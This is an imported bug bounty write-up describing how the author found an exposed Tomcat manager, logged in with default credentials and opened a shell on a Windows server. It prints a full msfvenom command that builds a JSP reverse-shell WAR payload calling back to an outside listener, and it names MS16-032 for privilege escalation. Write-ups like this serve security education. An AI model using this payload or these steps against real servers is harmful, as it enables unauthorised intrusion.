---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-08-09_from-tomcat-to-nt-authoritysystem.md
original_filename: 2018-08-09_from-tomcat-to-nt-authoritysystem.md
title: From TOMCAT to NT AUTHORITY\SYSTEM
category: documents
detected_topics:
- idor
- command-injection
- rate-limit
- cloud-security
tags:
- imported
- documents
- idor
- command-injection
- rate-limit
- cloud-security
language: en
raw_sha256: 3b81f5ea0142a623b79f9f22448eca289d58eff7f1addcbd700539a6b095aa1d
text_sha256: 2e0f7a7f277bb4035daef3e31642cfdfa16878d9f38244ba7922f10d2fdc100d
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# From TOMCAT to NT AUTHORITY\SYSTEM

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-08-09_from-tomcat-to-nt-authoritysystem.md
- Source Type: markdown
- Detected Topics: idor, command-injection, rate-limit, cloud-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `3b81f5ea0142a623b79f9f22448eca289d58eff7f1addcbd700539a6b095aa1d`
- Text SHA256: `2e0f7a7f277bb4035daef3e31642cfdfa16878d9f38244ba7922f10d2fdc100d`


## Content

---
title: "From TOMCAT to NT AUTHORITY\SYSTEM"
url: "https://medium.com/bugbountywriteup/from-tomcat-to-nt-authority-system-a79fa09c4abb"
authors: ["Rahul R"]
bugs: ["Default credentials"]
publication_date: "2018-08-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5761
scraped_via: "browseros"
---

# From TOMCAT to NT AUTHORITY\SYSTEM

From TOMCAT to NT AUTHORITY\SYSTEM
Rahul R
Follow
2 min read
·
Aug 9, 2018

458

1

So its been some time since I've done some Bug Bounty as I was busy working .

I wont be revealing the Program due to Privacy Issues …

I started my initial recon by doing some subdomain enumeration using KNOCKPY SUBLISTER etc..

And i got a subdomain named test.REDACTED.com there was nothing much to look for it returned a simple static HTML page , Then I did a Directory Scan using Dirsearch

“/manager” that's a TOMCAT LOGIN

Checking If it used default login was much more Satisfying

Please Don’t Question my PC name

And Drum roll…………..

Press enter or click to view image in full size

We have a LOGIN

Press enter or click to view image in full size
Oooh Weee

Now its time to pop a shell I used my AWS server as a Listener

Get Rahul R’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Generating a jsp payload can be achieved using this command

msfvenom -p java/jsp_shell_reverse_tcp LHOST=18.191.1**.* LPORT=4444 -f war > shell.war

**You can open your own custom port by adding it to the inbound rules section**

Now with the TCP handler

Press enter or click to view image in full size
Server is Running Apache 7.0

On Further enumeration I found that the Server is Microsoft Windows Server 2012 which was not looked after so often that last patch was on 2016 (poor guy)

And It was vulnerable to MS16–032 and I never tried to exploit it because it may piss off some of the DEVS.
